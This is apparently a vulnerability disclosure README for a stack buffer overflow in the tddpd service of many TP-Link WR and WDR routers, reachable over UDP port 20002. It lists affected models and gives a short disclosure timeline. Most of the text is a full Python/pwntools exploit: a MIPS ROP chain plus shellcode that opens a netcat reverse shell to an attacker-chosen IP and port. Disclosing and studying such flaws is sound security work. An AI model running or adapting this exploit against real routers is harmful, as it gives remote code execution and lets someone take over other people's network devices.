# TP-LINK-POC_2

TP-Link router have a stack overflow in tddpd server via port 20002.

Any user can get remote code execution through LAN, this vulnerability currently affects latest WR、WDR series, including WDR7400,WDR7500,WDR7660,WDR7800, WDR8400,WDR8500,WDR8600,WDR8620,WDR8640,WDR8660,WR880N,WR886N,WR890N,WR890N,WR882N,WR708N,WR842N,WR802N,WR710N,WR706N,WR702N etc. It affects the linux system and vxworks system. we believe there are much more models suffered from this vuln.

## Vulnerability description 

This vulnerability happen when tddpd server receive data by usinng recvfrom `udp port 20002`.Then with a series data processing,it arrive `memcopy`,we can contorl `a1` and `v5`that It lead to a stack buffer overflow to execute arbitrary code.

**It's different from CVE-2020-28877**

![](./poc.png)

## poc

Refer to this video: [poc_video](./poc.mkv)

**poc&exp**

```
#!/usr/bin/env python
# coding=utf-8
from pwn import *
if len(sys.argv)<3:
    print "Usage exp.py <target ip> <local ip>"
    exit(-1)
def critical(msg):
    sys.stdout.write('[\x1B[31m*\x1b[0m] ')
    for i in msg:
        sys.stdout.write(i)
        sleep(0.05)
    sleep(1)
def log(msg):
    sys.stdout.write('[\x1B[32m*\x1b[0m] ')
    sys.stdout.write(msg)
#REMOTE_IP="192.168.1.1"
REMOTE_IP=sys.argv[1]
LOCAL_IP=sys.argv[2]
#LOCAL_IP="192.168.1.101"
REMOTE_PORT=20002
LOCAL_LISTEN_PORT=8080
context.log_level='error'
context.endian='big'
context.arch='mips'
data=b''.join([
    p32(0xbeef0000),
    p32(0xbeef0001),
    p32(0xbeef0002),
    p32(0x100), #s0
    p32(0xbeef0004),
    p32(0),
    p32(0x4193c4), #s3
    p32(0x4070e0), #rip
    p32(0xbeef0008),# sp_1
    p32(0xbeef0009),
    p32(0xbeef000a),
    p32(0xbeef000b),
    p32(0xbeef000c),
    p32(0xbeef000d),
    p32(0xbeef000e),
    p32(0x419800-4), # s0
    p32(0),#s1
    p32(0x402960), #ra_1
    p32(0xbeef0012),# sp_2
    p32(0xbeef0013),
    p32(0xbeef0014),
    p32(0xbeef0015),
    p32(0xbeef0016),
    p32(0xbeef0017),
    p32(0xbeef0018),
    p32(0xbeef0019),#shellcode1
    p32(0x401790),
    p32(0xbeef001b),
    p32(0xbeef001c),#shellcode4
    p32(0xbeef001d),
    p32(0xbeef001e),
    p32(0x300),#s0_2
    p32(0xbeef0020),
    p32(0x4070e0),#ra_2
    p32(0xbeef0022),#sp_3
    p32(0xbeef0023),
    p32(0xbeef0024),
    p32(0xbeef0025),
    p32(0xbeef0026),
    p32(0xbeef0027),
    p32(0xbeef0028),
    p32(0),#s0
    p32(0x419810),#s1_2
    p32(0x403e40),
    p32(0xbeef002c),#sp
    p32(0xbeef002d),
    p32(0xbeef002e),
    p32(0xbeef002f),
    p32(0xbeef0030),
    p32(0xbeef0031),
    p32(0xbeef0032),
    p32(0x420000),#s0
    p32(0),#s1
    p32(0x4194d0),#s2 :memcpy_got
    p32(0x420000),#s3
    p32(0x401cf8),#ra 
    p32(0xbeef0038),#sp
    p32(0xbeef0039),#sp
    p32(0xbeef003a),#sp
    p32(0xbeef003b),#sp
    p32(0xbeef003c),#sp
    p32(0xbeef003d),#sp
    p32(0xbeef003e),#sp
    p32(0x420000),#s0
    p32(0),#s1
    p32(0x419804-4),#s2
    p32(0x420000),#s3
    p32(0x403a78),#r0
    p32(0xbeef0040),#sp
    p32(0xbeef0040),#sp
    p32(0xbeef0040),#sp
    p32(0xbeef0040),#sp
    p32(0xbeef0040),#sp
    p32(0xbeef0040),#sp
    p32(0x420000),#s0
    p32(0x401cf8),#ra
    p32(0xbeef0043),#sp
    p32(0xbeef0043),#sp
    p32(0xbeef0043),#sp
    p32(0xbeef0043),#sp
    p32(0xbeef0043),#sp
    p32(0xbeef0043),#sp
    p32(0xbeef0043),#sp
    p32(0xbeef0044),#s0
    p32(0xbeef0045),#s1
    p32(0xbeef0046),#s2
    p32(0xbeef0047),#s3
    p32(0x419940),#ra
])
data+='\x00\x00\x00\x01'*16
data+=p32(0xcafebabe)
data+=asm(shellcraft.execve(path='/bin/sh',argv=['sh','-c','mknod /tmp/a p; nc %s %s 0</tmp/a | /bin/sh 1>/tmp/a 2>&1;'%(LOCAL_IP,LOCAL_LISTEN_PORT)]))

len2=len(data)
len1=4+len2
hash=0x5a6b7c8d

payload=  b'\x01\x00'+p16(2)+p16(len1)+b'\x21\x00'
payload+= p32(0xdeadbeef)+p32(0x5a6b7c8d)
payload+= p16(1)+p16(len2)+data

kk=0
for i in range(len(payload)//4):
    kk=(kk+u32(payload[4*i:4*i+4]))%0x100000000
info("hash 0x%x"%kk)
payload=  b'\x01\x00'+p16(2)+p16(len1)+b'\x21\x00'
payload+= p32(0xdeadbeef)+p32(kk)
payload+= p16(1)+p16(len2)+data
critical("We login to the management interface just for checking the version of firmware, the exploit itself requires nothing but the connection to the router's LAN.\n")
log('Start connection to %s...'%REMOTE_IP)
p=remote(REMOTE_IP,REMOTE_PORT,typ='udp')
sleep(1)
sys.stdout.write('Connect success\n')
log('Start exploiting')
for i in range(10):
    sys.stdout.write('.')
    sleep(1)
print ''
p.send(payload)
log('Exploit success! Try connect router with telnet %s at port 1234\n'%REMOTE_IP)

```

## Timeline

2020.10.24 show in GeekPwn

2020.12.01 report to CVE and TP-Link
